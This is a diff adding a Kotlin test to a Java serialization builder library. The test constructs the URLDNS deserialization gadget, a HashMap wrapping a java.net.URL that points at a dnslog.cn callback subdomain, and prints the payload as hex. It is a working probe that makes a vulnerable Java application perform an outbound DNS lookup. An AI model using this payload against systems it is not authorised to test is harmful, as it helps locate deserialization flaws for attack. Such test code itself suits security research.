@@ -358,4 +358,62 @@ class AllTests : StringSpec({
 
         actualData?.toHex() shouldBe expectedData.toHex()
     }
+
+    "Sample gadget: URLDNS" {
+        val payload = Serial {
+            descriptors {
+                desc {
+                    typeName = "java.util.HashMap"
+                    uid = 362498820763181265L
+                    flags = SC_SERIALIZABLE or SC_WRITE_METHOD
+
+                    "loadFactor" type Float::class.java
+                    "threshold" type Int::class.java
+                }
+            }
+            slot {
+                prims {
+                    floatVal(0.75f)
+                    intVal(12)
+                }
+                writeObject {
+                    it.write(byteArrayOf(0, 0, 0, 16, 0, 0, 0, 1))
+                    serialObj {
+                        descriptors {
+                            desc {
+                                typeName = "java.net.URL"
+                                uid = -7627629688361524110L
+                                flags = SC_SERIALIZABLE or SC_WRITE_METHOD
+
+                                "hashCode" type Int::class.java
+                                "port" type Int::class.java
+                                "authority" type String::class.java
+                                "file" type String::class.java
+                                "host" type String::class.java
+                                "protocol" type String::class.java
+                                "ref" typeName "java.lang.String"
+                            }
+                        }
+                        slot {
+                            prims {
+                                intVal(-1)
+                                intVal(-1)
+                            }
+                            objs {
+                                string("dserial.kyrvep.dnslog.cn")
+                                string("")
+                                string("dserial.kyrvep.dnslog.cn")
+                                string("http")
+                                nil()
+                            }
+                            writeObject {}
+                        }
+                    }
+                    string("http://dserial.kyrvep.dnslog.cn")
+                }
+            }
+        }
+
+        println(payload?.toHex())
+    }
 })
